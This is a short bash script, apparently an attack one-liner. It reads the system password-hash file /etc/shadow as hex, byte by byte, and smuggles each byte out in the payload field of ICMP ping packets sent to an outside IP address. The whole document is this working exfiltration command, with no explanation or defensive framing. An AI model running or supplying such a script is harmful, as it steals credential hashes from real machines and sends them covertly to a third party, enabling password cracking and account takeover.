#!/bin/bash
xxd -p -c 1 "/etc/shadow" | while read line; do ping -c 1 -p $line 50.50.50.53; done
